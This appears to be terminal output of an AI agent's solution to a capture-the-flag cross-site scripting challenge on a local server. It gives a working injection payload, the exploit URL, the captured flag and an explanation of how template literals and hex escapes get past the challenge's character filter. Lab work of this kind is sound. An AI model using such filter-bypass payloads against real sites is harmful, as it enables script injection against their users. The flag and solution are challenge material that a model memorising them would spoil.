[32m│[0m ## Winning Payload: **Template Literal with Hex Escapes**                    [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Payload:** `\";alert`\x58\x53\x53`;// `                                    [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **URL:** `http://127.0.0.1:32908/page?name=\";alert`\x58\x53\x53`;//`        [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **FLAG:**                                                                    [32m│[0m
[32m│[0m `FLAG{33bc7ee7e2571d6300505e102d0fea2349dd7a3d6e788290d314035dca4839b9}`     [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### How It Works:                                                            [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m 1. **Breakout:** `\"` - The backslash escapes the application's backslash,   [32m│[0m
[32m│[0m allowing the double quote to close the string                                [32m│[0m
[32m│[0m 2. **Execute Code:** `;alert`\x58\x53\x53`;` - Uses JavaScript template      [32m│[0m
[32m│[0m literals (backticks) with hex escape sequences:                              [32m│[0m
[32m│[0m    - `\x58` = 'X'                                                            [32m│[0m
[32m│[0m    - `\x53` = 'S'                                                            [32m│[0m
[32m│[0m    - `\x53` = 'S'                                                            [32m│[0m
[32m│[0m    - Result: Alerts "XSS" without using literal 'S' character                [32m│[0m
[32m│[0m 3. **Comment Rest:** `//` - Comments out the remaining quote                 [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Injected JavaScript:**                                                     [32m│[0m
[32m│[0m ```javascript                                                                [32m│[0m
[32m│[0m var name = "\\";alert`\x58\x53\x53`;//"                                      [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m Which becomes:                                                               [32m│[0m
[32m│[0m - `var name = "\\";` - Variable with backslash                               [32m│[0m
[32m│[0m - `alert`\x58\x53\x53`;` - **EXECUTES** alert with "XSS"                     [32m│[0m
[32m│[0m - `//";` - Comment                                                           [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### Why This Worked:                                                         [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ✅ **Template literals** (backticks) don't get escaped by the application    [32m│[0m
[32m│[0m ✅ **Hex escapes** (`\x58\x53\x53`) spell "XSS" without literal 'S'          [32m│[0m
[32m│[0m character                                                                    [32m│[0m
[32m│[0m ✅ **Backslash technique** breaks out of the string context                  [32m│[0m
[32m│[0m ✅ Bypasses the filter that blocks:                                          [32m│[0m
[32m│[0m   - Single quotes `'`                                                        [32m│[0m
[32m│[0m   - Uppercase 'C' (from methods like `fromCharCode`)                         [32m│[0m
[32m│[0m                                                                              [32m│[0m
